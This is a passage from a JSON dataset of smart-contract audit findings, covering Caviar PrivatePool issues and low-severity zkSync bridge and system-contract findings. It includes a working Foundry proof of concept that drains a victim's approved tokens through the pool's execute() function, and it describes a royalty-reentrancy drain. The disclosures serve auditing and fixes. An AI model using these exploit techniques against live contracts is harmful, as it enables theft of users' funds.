virtualNftReserves += uint128(weightSum);\n```\n\n**[outdoteth (Caviar) acknowledged](https://github.com/code-423n4/2023-04-caviar-findings/issues/167)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/167#issuecomment-1528976332):**\n > The Warden has identified a risky underflow due to unsafe casting, the underflow would cause the invariants of the protocol to be broken, causing it to behave in undefined ways, most likely allowing to discount tokens (principal)\n> \n> I have considered downgrading to Medium Severity\n> \n> However, I believe that in multiple cases the subtractions  `netInputAmount - feeAmount - protocolFeeAmount` which could start with `netInputAmount > type(uint128).max` would not necessarily fall within a `uint128`\n> \n> For this reason, I believe the finding to be of High Severity.\n\n**[outdoteth (Caviar) mitigated](https://github.com/code-423n4/2023-04-caviar-findings/issues/167):**\n> Fixed in https://github.com/outdoteth/caviar-private-pools/pull/10.\n\n**Status:** Mitigation confirmed. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/20), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/37), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/7).\n\n\n\n***\n\n \n",
      "summary": "\nA bug report has been submitted for the code-423n4/2023-04-caviar repository on GitHub. The report identifies a vulnerability in the `buy()` and `sell()` functions of the PrivatePool.sol file. These functions update two variables, `virtualBaseTokenReserves` and `virtualNftReserves`, with values of type `uint256` but these variables are of type `uint128`. This means that casting to a lower type is necessary, but this casting is performed without first checking that the values being cast can fit into the lower type, leading to a risk of a silent overflow occurring during the casting process. \n\nIf the reserves variables are updated with a silent overflow, it can lead to a breakdown of the xy=k equation, resulting in a totally incorrect price calculation and potential financial losses for users or pool owners. A proof of concept has been provided to demonstrate the vulnerability.\n\nThe recommended mitigation steps are to add checks that the casting value is not greater than the `uint128` type max value. This can be done by adding the following lines of code to the PrivatePool.sol file: \n\n```solidity\nFile: PrivatePool.sol\n229:         // update the virtual reserves\n+            if (netInputAmount - feeAmount - protocolFeeAmount > type(uint128).max) revert Overflow();\n230:         virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount); \n+            if (weightSum > type(uint128).max) revert Overflow();\n231:         virtualNftReserves -= uint128(weightSum);\n\nFile: PrivatePool.sol\n322:         // update the virtual reserves\n+            if (netOutputAmount + protocolFeeAmount + feeAmount > type(uint128).max) revert Overflow();\n323:         virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);\n+            if (weightSum > type(uint128).max) revert Overflow();\n324:         virtualNftReserves += uint128(weightSum);\n```\n\nThis bug report has identified a vulnerability in the code-423n4/2023-04-caviar repository on GitHub. The vulnerability is related to the `buy()` and `",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/167",
      "tags": [
        "Type casting",
        "Overflow/Underflow"
      ],
      "finders": [
        "tsvetanovv",
        "matrix_0wl",
        "giovannidisiena",
        "Cryptor",
        "Kaysoft",
        "lukris02",
        "ayden",
        "codeslide",
        "sashik_eth",
        "tnevler",
        "Sathish9098",
        "sayan",
        "adriro",
        "Kenshin",
        "0xAgro",
        "btk",
        "0x4non",
        "devscrooge",
        "georgits",
        "W0RR1O",
        "SaeedAlipoor01988",
        "0x6980",
        "catellatech",
        "Madalad"
      ]
    },
    {
      "id": "16244",
      "title": "[H-02] PrivatePool owner can steal all ERC20 and NFT from user via arbitrary execution",
      "impact": "HIGH",
      "content": "\nIn the current implementation of the PrivatePool.sol, the function execute is meant to claim airdrop, however, we cannot assume the owner is trusted because anyone can permissionlessly create private pool.\n\n```solidity\n/// @notice Executes a transaction from the pool account to a target contract. The caller must be the owner of the\n/// pool. This allows for use cases such as claiming airdrops.\n/// @param target The address of the target contract.\n/// @param data The data to send to the target contract.\n/// @return returnData The return data of the transaction.\nfunction execute(address target, bytes memory data) public payable onlyOwner returns (bytes memory) {\n\t// call the target with the value and data\n\t(bool success, bytes memory returnData) = target.call{value: msg.value}(data);\n\n\t// if the call succeeded return the return data\n\tif (success) return returnData;\n\n\t// if we got an error bubble up the error message\n\tif (returnData.length > 0) {\n\t\t// solhint-disable-next-line no-inline-assembly\n\t\tassembly {\n\t\t\tlet returnData_size := mload(returnData)\n\t\t\trevert(add(32, returnData), returnData_size)\n\t\t}\n\t} else {\n\t\trevert();\n\t}\n}\n```\n\nThe owner of private pool can easily steal all ERC20 token and NFT from the user's wallet after the user gives approval to the PrivatePool contract and the user has to give the approval to the pool to let the PrivatePool pull ERC20 token and NFT from the user when user buy or sell or change from EthRouter or directly calling PrivatePool.\n\nThe POC below shows, the owner of the PrivatePool can carefully craft payload to steal funds via arbitrary execution.\n\nAfter user's apporval, the target can be an ERC20 token address or a NFT address, the call data can be the payload of transferFrom or function.\n\nPlease add the code to Execute.t.sol so we can create a mock token:\n\n```solidity\ncontract MyToken is ERC20 {\n    constructor() ERC20(\"MyToken\", \"MTK\", 18) {}\n\n    function mint(address to, uint256 amount) public {\n        _mint(to, amount);\n    }\n}\n```\n\nPlease add the POC below to Execute.t.sol:\n\n```solidity\n  function testStealFundArbitrary_POC() public {\n        MyToken token = new MyToken();\n\n        address victim = vm.addr(1040341830);\n        address hacker = vm.addr(14141231201);\n\n        token.mint(victim, 100000 ether);\n\n        vm.prank(victim);\n        token.approve(address(privatePool), type(uint256).max);\n\n        console.log(\n            \"token balance of victim before hack\",\n            token.balanceOf(victim)\n        );\n\n        address target = address(token);\n        bytes memory data = abi.encodeWithSelector(\n            ERC20.transferFrom.selector,\n            victim,\n            hacker,\n            token.balanceOf(victim)\n        );\n\n        privatePool.execute(target, data);\n\n        console.log(\n            \"token balance of victim  after hack\",\n            token.balanceOf(victim)\n        );\n    }\n```\n\nWe run the POC, the output is:\n\n```solidity\nPS D:\\2023Security\\2023-04-caviar> forge test -vv --match \"testStealFundArbitrary_POC\"\n[] Compiling...\n[] Compiling 1 files with 0.8.19\n[] Solc 0.8.19 finished in 8.09s\nCompiler run successful\n\nRunning 1 test for test/PrivatePool/Execute.t.sol:ExecuteTest\n[PASS] testStealFundArbitrary_POC() (gas: 753699)\nLogs:\n  token balance of victim before hack 100000000000000000000000\n  token balance of victim  after hack 0\n```\n\nAs we can see, the victim's ERC20 token are stolen.\n\n### Recommended Mitigation Steps\n\nWe recommend the protocol not let the private pool owner perform arbtirary execution. The private pool can use the flashloan to claim the airdrop himself.\n\n**[outdoteth (Caviar) confirmed and mitigated](https://github.com/code-423n4/2023-04-caviar-findings/issues/184#issuecomment-1519844839):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/2\n> \n> The proposed fix is to revert if execute tries to call the `baseToken` or `nft` contract. It's very unlikely a user will approve any other token than these to the pool so this serves as a sufficient check to prevent the stealing outlined in the exploit.\n> \n> ```solidity\n> if (target == address(baseToken) || target == address(nft)) revert InvalidTarget();\n> ```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/184#issuecomment-1525196191):**\n > @outdoteth - Wouldn't the owner be the one owning all of the deposited assets anyway?\n\n**[outdoteth (Caviar) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/184#issuecomment-1525531130):**\n > @GalloDaSballo - The exploit is not about the owner having ownership over owned deposits but rather about stealing non-deposited user funds.\n> \n> For example,\n> \n> * Alice wants to sell her Milady 123. She also holds Milady 555 and 111.\n> * She approves the PrivatePool to spend all of her Miladies so that she can subsequently call \"sell()\"\n> * The malicious owner of the pool then calls \"execute()\" multiple times with a payload that calls the Milady contract and `transferFrom` to transfer all of her Miladies (123, 555, 111) from her wallet\n> \n> Alice has now lost all of her Miladies. The same also applies to baseToken approvals when Alice wants to buy some NFTs.\n> \n> The proposed fix is to prevent `execute()` from being able to call the `baseToken` or `nft` contracts so that the above example can never occur.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/184#issuecomment-1528976654):**\n > Thank you @outdoteth for clarifying.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/184#issuecomment-1528977331):**\n > The Warden has shown how, because of the`setApprovalForAll` pattern, mixed with the `execute` function, a `PrivatePool` may be used to harvest approvals from users, causing them to lose all tokens.\n> \n> I have considered downgrading the finding because of the Router technically providing a safety check against the pool.\n> \n> However, I believe that the risky pattern of direct approvals to the pool is demonstrated by the pull transfer performed by the FlashLoan function:\n> https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L648-L649\n> \n> ```solidity\n>         ERC721(token).safeTransferFrom(address(receiver), address(this), tokenId);\n> \n> ```\n> \n> For that call to work, the user / user-contract will have to have approved the pool directly.\n> \n> For this reason I agree with High Severity.\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/25), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/36), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/6).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the PrivatePool.sol code which allows the owner of the PrivatePool to steal all ERC20 tokens and NFT from users. This is possible because the function execute is meant to claim airdrops, but the owner can permissionlessly create a private pool and use it to steal from users. The proof of concept code provided shows that the owner can carefully craft a payload to steal funds via arbitrary execution. It is recommended that the protocol not let the private pool owner perform arbitrary execution, and instead use flashloans to claim the airdrop.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/184",
      "tags": [],
      "finders": [
        "ladboy233",
        "Emmanuel",
        "0xTheC0der",
        "nobody2018",
        "ulqiorra",
        "giovannidisiena",
        "minhtrng",
        "decade",
        "nemveer",
        "sashik_eth",
        "teddav",
        "Voyvoda",
        "Norah",
        "Noro",
        "0x4non",
        "JGcarv",
        "said",
        "oxen",
        "sces60107",
        "Koolex",
        "Ruhum",
        "chaduke",
        "ElKu"
      ]
    },
    {
      "id": "16243",
      "title": "[H-01] Royalty receiver can drain a private pool",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L252>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268> \n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L274>\n\n### Impact\n\nRoyalty fee calculation has a serious flaw in `buy(...)`. Caviar's private pools could be completely drained.\n\nIn the Caviar private pool, [NFT royalties](https://eips.ethereum.org/EIPS/eip-2981) are being paid from the `msg.sender` to the NFT royalty receiver of each token in PrivatePool.buy and PrivatePool.sell:\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L271-L285>\n\n```solidity\n        #buy(uint256[],uint256[],MerkleMultiProof)\n\n271:    if (payRoyalties) {\n            ...\n274:        (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);\n            ...\n278:        if (baseToken != address(0)) {\n279:            ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n280:        } else {\n281:            recipient.safeTransferETH(royaltyFee);\n282:        }\n```\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L328-L352>\n\n```solidity\n        #sell(uint256[],uint256[],MerkleMultiProof,IStolenNftOracle.Message[])\n\n329:    for (uint256 i = 0; i < tokenIds.length; i++) {\n            ...\n333:        if (payRoyalties) {\n                ...\n338:            (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);\n                ...\n345:            if (baseToken != address(0)) {\n346:                ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n347:            } else {\n348:                recipient.safeTransferETH(royaltyFee);\n349:            }\n```\n\nIn both functions, the amount needed to pay all royalties is taken from the `msg.sender` who is either the buyer or the seller depending on the context. In PrivatePool.sell, this amount is first paid by the pool and then taken from the `msg.sender` by simply reducing what they receive in return for the NFTs they are selling. A similar thing is done in PrivatePool.buy, but instead of reducing the output amount, the input amount of base tokens that the `msg.sender` (buyer) should pay to the pool is increased:\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L251-L252>\n\n```solidity\n        #buy(uint256[],uint256[],MerkleMultiProof)\n\n251:    // add the royalty fee amount to the net input aount\n252:    netInputAmount += royaltyFeeAmount;\n```\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L354-L355>\n\n```solidity\n        #sell(uint256[],uint256[],MerkleMultiProof,IStolenNftOracle.Message[])\n\n354:    // subtract the royalty fee amount from the net output amount\n355:    netOutputAmount -= royaltyFeeAmount;\n```\n\nThe difference between these two functions (that lies at the core of the problem) is that in PrivatePool.buy, the `_getRoyalty` function is called twice. The first time is to calculate the total amount of royalties to be paid, and the second time is to actually send each royalty fee to each recipient:\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L242-L248>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L273-L274>\n\n```solidity\n        #buy(uint256[],uint256[],MerkleMultiProof)\n\n242:    if (payRoyalties) {\n243:        // get the royalty fee for the NFT\n244:        (uint256 royaltyFee,) = _getRoyalty(tokenIds[i], salePrice); // @audit _getRoyalty called 1st time\n245:\n246:        // add the royalty fee to the total royalty fee amount\n247:        royaltyFeeAmount += royaltyFee;\n248:    }\n        \n        ...\n        \n273:    // get the royalty fee for the NFT\n274:    (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice); // @audit  _getRoyalty called 2nd time\n```\n\nThis is problematic because an attacker could potentially change the royalty fee between the two calls, due to the following untrusted external call:\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268>\n\n```solidity\n        #buy(uint256[],uint256[],MerkleMultiProof)\n\n267:    // refund any excess ETH to the caller\n268:    if (msg.value > netInputAmount) msg.sender.safeTransferETH(msg.value - netInputAmount); // @audit untrusted external call\n```\n\nIf the `msg.sender` is a malicious contract that has control over the `royaltyFee` for the NFTs that are being bought, they can change it, for example, from 0 basis points (0%) to 10000 basis points (100%) in their `receive()` function.\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/common/ERC2981.sol#L94-L99>\n\n```solidity\n        // @audit An attacker can call this setter function between the two `_getRoyalty()` calls.\n94:     function _setTokenRoyalty(uint256 tokenId, address receiver, uint96 feeNumerator) internal virtual {\n95:         require(feeNumerator <= _feeDenominator(), \"ERC2981: royalty fee will exceed salePrice\");\n96:         require(receiver != address(0), \"ERC2981: Invalid parameters\");\n97:\n98:         _tokenRoyaltyInfo[tokenId] = RoyaltyInfo(receiver, feeNumerator);\n99:     }\n```\n\nThat way, the amount transferred by the `msg.sender` for royalties will be 0 because the total `royaltyFeeAmount` is calculated based on the first value (0%) but the actual sent amount to the receiver is determined by the second value (100%). This will result in the whole price paid for the NFT being returned to the royalty receiver, but being paid by the Pool instead of the `msg.sender`.\n\nThe `msg.sender` has therefore received the NFT but paid the whole price for it to the royalty receiver and 0 to the Pool. If the `msg.sender` is the royalty receiver, they will basically have spent 0 base tokens (not counting gas expenses) but received the NFT in their account. They can then sell it to the same private pool to exchange it for base tokens.\n\nThis is an extreme scenario, however, the developers have acknowledged ERC-2981 and that `royaltyInfo(...)` returns an arbitrary address. In the future we could see projects that have royalty payments that fluctuate such as increasing/decaying royalties over time [article on eip 2981](https://www.gemini.com/blog/exploring-the-nft-royalty-standard-eip-2981) or projects that delegate the creation of nfts to the users such as 1024pixels [polygon](0x1024Accd05Fa01AdbB74502DBDdd8e430d610c53), [git repo](https://github.com/michaelliao/1024pixels/blob/master/contracts/1024pixels.sol) and royalties are paid to each user rather to a single creator. In such cases invocation of `_getRoyalty(...)`  twice with external calls that transfer assets in-between is a vulnerable pattern that is sure to introduce asset risks and calculation inaccuracies both for the users and protocol itself. Immediate remedy would be to simplify `buy(...)` in `PrivatePool.sol` to use only one `for loop` and call `_getRoyalty(...)` once.\n\nPoC shows how the entire Pool's base tokens can be drained by a single royalty receiver using a single NFT assuming that the royalty receiver has control over the royaltyFee.\n\n### Proof of Concept\n\nSee warden's [original submission](https://github.com/code-423n4/2023-04-caviar-findings/issues/320) for full Proof of Concept.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nEnsure that the amount sent to the NFT royalty receivers in the second `for` loop in `buy()` is the same as the amount calculated in the first `for` loop.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/320#issuecomment-1529062037):**\n > The Warden has shown how, because of reEntrancy and due to the same call being performed for royalties, a malicious royalty recipient can drain the pool of all funds.\n> \n> I have considered downgrading the finding because of the conditionality of the royalty recipient being malicious, however, I don't believe this can be considered an external condition, as any account able to change the royalty setting could willingly or unwillingly enable the attack.\n> \n> For this reason I believe that the finding is of High Severity.\n\n**[outdoteth (Caviar) confirmed via duplicate issue `#593` and mitigated](https://github.com/code-423n4/2023-04-caviar-findings/issues/593#issuecomment-1520075272):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/12.\n\n**Status:** Mitigation confirmed. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/27), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/35), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/5).\n\n\n\n***\n\n",
      "summary": "\nA bug report has been made on the Caviar Private Pool where royalty fees are paid from the `msg.sender` to the NFT royalty receiver of each token in PrivatePool.buy and PrivatePool.sell. In both functions, the amount needed to pay all royalties is taken from the `msg.sender` who is either the buyer or the seller depending on the context. \n\nThe bug lies in the fact that in PrivatePool.buy, the `_getRoyalty` function is called twice. The first time is to calculate the total amount of royalties to be paid, and the second time is to actually send each royalty fee to each recipient. This is problematic because an attacker could potentially change the royalty fee between the two calls, due to an untrusted external call. If the `msg.sender` is a malicious contract that has control over the `royaltyFee` for the NFTs that are being bought, they can change it, for example, from 0 basis points (0%) to 10000 basis points (100%). This will result in the whole price paid for the NFT being returned to the royalty receiver, but being paid by the Pool instead of the `msg.sender`. \n\nA proof of concept has been created to show how the entire Pool's base tokens can be drained by a single royalty receiver using a single NFT. The tools used for this bug report were manual review and Foundry. The recommended mitigation step is to ensure that the amount sent to the NFT royalty receivers in the second `for` loop in `buy()` is the same as the amount calculated in the first `for` loop.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/320",
      "tags": [],
      "finders": [
        "teddav",
        "Voyvoda",
        "aviggiano",
        "Haipls",
        "AkshaySrivastav"
      ]
    },
    {
      "id": "10333",
      "title": "Unnecessarily Delayed Error Handling",
      "impact": "LOW",
      "content": "When depositing ERC-20 tokens, the `L1ERC20Bridge` contract [queries the tokens metadata](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol#L170-L175), and [sends the results](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol#L163-L166) to the `L2ERC20Bridge` contract. Any errors are still encoded on L1 and [discarded](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol#L69-L90) on the L2 bridge. This pattern seems unnecessarily complex, and couples the processing on both sides. Consider detecting errors on L1 and only sending the relevant values over the bridge.\n\n\n***Update:** Acknowledged, will resolve. The Matter Labs team stated:*\n\n\n\n> *We will take this change into account when further refactoring is done.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10332",
      "title": "Floating Pragma Solidity Version",
      "impact": "LOW",
      "content": "Throughout the [bridge](https://github.com/matter-labs/zksync-2-contracts/tree/9f3c6944e6320166edd96ef6586a9dd4548a27f2) and the [system contracts](https://github.com/matter-labs/system-contracts/tree/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f) codebases, the version of Solidity used is `^0.8.0`. This version indicates that any compiler version after `0.8.0` can be used to compile the source code. However, the code will not compile when using version `0.8.7` or earlier since there are functions which override interface functions without using the keyword `override`. This is only permitted in [Solidity `0.8.8` and above](https://blog.soliditylang.org/2021/09/27/solidity-0.8.8-release-announcement/). In addition, there is the usage of `abi.encodeCall`, which was not introduced until Solidity `0.8.11`. However, it is recommended to use Solidity `0.8.13` or above since there was a [bug detected](https://blog.soliditylang.org/2022/03/16/encodecall-bug/) regarding fixed-length bytes literals. While this bug does not currently affect the codebase, using an updated version will remove the possibility of future errors.\n\n\nConsider upgrading all contracts to Solidity version `0.8.13` at a minimum, but ideally to the latest version.\n\n\n***Update:** Resolved in [pull request #66](https://github.com/matter-labs/zksync-2-contracts/pull/66) at commit [e422c7f](https://github.com/matter-labs/zksync-2-contracts/pull/66/commits/e422c7f81dca0e07f4d3ede0e5d7994edcf05a8f). Regarding the floating point Solidity version, the Matter Labs team stated:*\n\n\n\n> *System contracts are exposing the System API to smart contract developers, so the code they write will have to adhere to the same compiler versions limitations. Similarly to OpenZeppelin Smart Contracts libraries, our System Contracts enforce the minimum Solidity version to ensure that they can be properly built, but do not pin a specific version, so we do not prevent the developers from using newer features.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10331",
      "title": "Implicit Zero Cost Assumption",
      "impact": "LOW",
      "content": "The `L1ERC20Bridge` contract will deploy the Layer 2 token bridge by [passing a request](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol#L98) to the Mailbox. However, it will not send any ETH. This is acceptable while the [stub fee calculation](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/zksync/facets/Mailbox.sol#L141-L156) uses a zero fee, but when the calculation is updated, messages that do not pay fees [will be rejected](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/zksync/facets/Mailbox.sol#L262).\n\n\nIn the interest of predictability, consider allowing ETH to be sent with the L2 bridge deployment request.\n\n\n***Update:** Resolved in [pull request #65](https://github.com/matter-labs/zksync-2-contracts/pull/65) at commit [15b3433](https://github.com/matter-labs/zksync-2-contracts/pull/65/commits/15b343399b43ebdfc6b4211fa05e3347b36e7bc3).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10330",
      "title": "setValueUnderNonce Value Is Mutable",
      "impact": "LOW",
      "content": "In the `NonceHolder` contract, the `setValueUnderNonce` function [sets a specific `_value`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/NonceHolder.sol#L85) associated with a particular `_key` (nonce). While setting it to `1` would be enough to simply convey if a specific nonce has already been used, it is actually a `uint256` value. According to the internal documentation shared with us, it could be used to store some valuable information. This could correspond to details about the particular transaction that consumed this nonce (e.g., the amount of wei that was sent in the transaction).\n\n\nWhile a user cannot reset the `_value` to 0, they can change it to any other non-zero quantity. This can be misleading for external entities that may be relying on it for particular information about the transaction. More importantly, since no event is emitted, an external party may not know that it has been changed.\n\n\nConsider requiring that the `_value` for a particular `_key` is settable only once. Alternatively, if it is intended to be mutable, consider emitting an event every time it is set.\n\n\n***Update:** Resolved in [pull request #215](https://github.com/matter-labs/system-contracts/pull/215) at commit [d6fd17d](https://github.com/matter-labs/system-contracts/pull/215/commits/d6fd17d16101075de2929e1d08c418134ea5803a). The Matter Labs team stated:*\n\n\n\n> *It is mutable in case users want to store some valuable data under the respective nonce. For example, a user might want to store a mapping such as `(uniqueNonce => someInternalConstant)`.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10329",
      "title": "Lack of Events",
      "impact": "LOW",
      "content": "In [`ContractDeployer.sol`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/ContractDeployer.sol), there is no event emitted when an [`AccountAbstractionVersion`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/ContractDeployer.sol#L75) or an [`AccountNonceOrdering`] (<https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/ContractDeployer.sol#L81>) are updated, which makes it challenging to monitor whether an account has updated either of these values.\n\n\nIn addition, the [`DepositInitiated` event](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol#L137) should emit the L2 transaction hash, because it may be [needed](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol#L188) to claim a failed deposit.\n\n\nConsider emitting and updating these events to facilitate monitoring.\n\n\n***Update:** Resolved in [pull request #214](https://github.com/matter-labs/system-contracts/pull/214) at commit [d398cce](https://github.com/matter-labs/system-contracts/pull/214/commits/d398cce18c93e6ff6710a12463ed388fd8a65db2) and [pull request #63](https://github.com/matter-labs/zksync-2-contracts/pull/64) at commit [d0ce4d4](https://github.com/matter-labs/zksync-2-contracts/pull/64/commits/d0ce4d435786cce34b131549f9e5fa3d810caf0d).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10328",
      "title": "Potential EIP-1052 Deviation",
      "impact": "LOW",
      "content": "On zkSync, the `EXTCODEHASH` opcode is realized by using the [`getCodeHash` function](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/AccountCodeStorage.sol#L74) of the `AccountCodeStorage` contract. This returns the registered bytecode hashes for deployed contracts. The [EIP-1052](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1052.md#test-cases) standard dictates that the return of precompile contracts should be either `0` or `c5d246...` (the hash of the empty string). However, precompile code hashes can differ from those values by [setting them](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/AccountCodeStorage.sol#L34) to their real code hash or to an arbitrary value during a [forced deployment](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/ContractDeployer.sol#L249), thereby causing an inconsistency with EIP-1052.\n\n\nConsider conforming to EIP-1052 by adding additional checks to ensure that the precompile contracts return either of the values defined in the specification.\n\n\n***Update:** Resolved in [pull request #213](https://github.com/matter-labs/system-contracts/pull/213) at commit [98cb968](https://github.com/matter-labs/system-contracts/pull/213/commits/98cb9687ca3f2ad1fe8b350ebd8ef942d5bc5bdb). The Matter Labs team stated:*\n\n\n\n> *We also added the correct codehash/codesize for the zero-address.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10327",
      "title": "L2ERC20Bridge Is Not Upgradeable",
      "impact": "LOW",
